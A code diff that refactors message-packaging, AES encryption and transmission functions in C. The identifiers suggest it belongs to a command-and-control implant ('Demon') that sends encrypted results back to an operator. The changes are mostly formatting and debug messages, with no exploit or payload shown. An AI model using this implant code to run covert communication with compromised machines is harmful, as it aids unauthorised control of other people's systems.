@@ -102,25 +102,26 @@ VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
 
 VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
 {
-    if ( ! Package && Size )
+    if ( ! Package && Size ) {
         return;
+    }
 
     PackageAddInt32( Package, Size );
 
     if ( Size )
     {
         Package->Buffer = Instance.Win32.LocalReAlloc(
-                Package->Buffer,
-                Package->Length + Size,
-                LMEM_MOVEABLE | LMEM_ZEROINIT
+            Package->Buffer,
+            Package->Length + Size,
+            LMEM_MOVEABLE | LMEM_ZEROINIT
         );
 
         Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );
 
         MemCopy( Package->Buffer + Package->Length, Data, Size );
 
-        Package->Size   =   Package->Length;
-        Package->Length +=  Size;
+        Package->Size   =  Package->Length;
+        Package->Length += Size;
     }
 }
 
@@ -178,29 +179,14 @@ PPACKAGE PackageCreateWithRequestID( UINT32 RequestID, UINT32 CommandID )
     return Package;
 }
 
-PPACKAGE PackageNew()
-{
-    PPACKAGE Package = NULL;
-
-    Package          = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer  = Instance.Win32.LocalAlloc( LPTR, 0 );
-    Package->Length  = 0;
-    Package->Encrypt = FALSE;
-    Package->Destroy = TRUE;
-
-    PackageAddInt32( Package, 0 );
-
-    return Package;
-}
-
 VOID PackageDestroy( PPACKAGE Package )
 {
-    if ( ! Package )
+    if ( ! Package ) {
         return;
+    }
 
-    if ( ! Package->Buffer )
-    {
-        PUTS( "! Package->Buffer" )
+    if ( ! Package->Buffer ) {
+        PUTS( "Package Buffer empty" )
         return;
     }
 
@@ -221,8 +207,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 
     if ( Package )
     {
-        if ( ! Package->Buffer )
-        {
+        if ( ! Package->Buffer ) {
             PUTS( "Package->Buffer is empty" )
             return FALSE;
         }
@@ -234,25 +219,27 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
         {
             Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
-            if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
+            /* only add these on init or key exchange */
+            if ( Package->CommandID == DEMON_INITIALIZE ) {
                 Padding += 32 + 16;
+            }
 
             AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
-        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
+        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
             Success = TRUE;
-        else
+        } else {
             PUTS("TransportSend failed!")
+        }
 
-        if ( Package->Destroy )
+        if ( Package->Destroy ) {
             PackageDestroy( Package );
-        else if ( Package->Encrypt )
+        } else if ( Package->Encrypt ) {
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
-    }
-    else
-    {
+        }
+    } else {
         PUTS( "Package is empty" )
         Success = FALSE;
     }
@@ -262,15 +249,14 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
 
 VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
 {
-    PRINTF( "Transmit Error: %d\n", ErrorCode );
-    PPACKAGE Package = PackageCreate( DEMON_ERROR );
+    PPACKAGE Package = NULL;
 
-    PUTS( "Add Error ID" )
+    PRINTF( "Transmit Error: %d\n", ErrorCode );
+
+    Package = PackageCreate( DEMON_ERROR );
+
     PackageAddInt32( Package, ID );
-    PUTS( "Add Error Code" )
     PackageAddInt32( Package, ErrorCode );
-    PUTS( "Send Error" )
     PackageTransmit( Package, NULL, NULL );
-    PUTS( "Send" )
 }
 
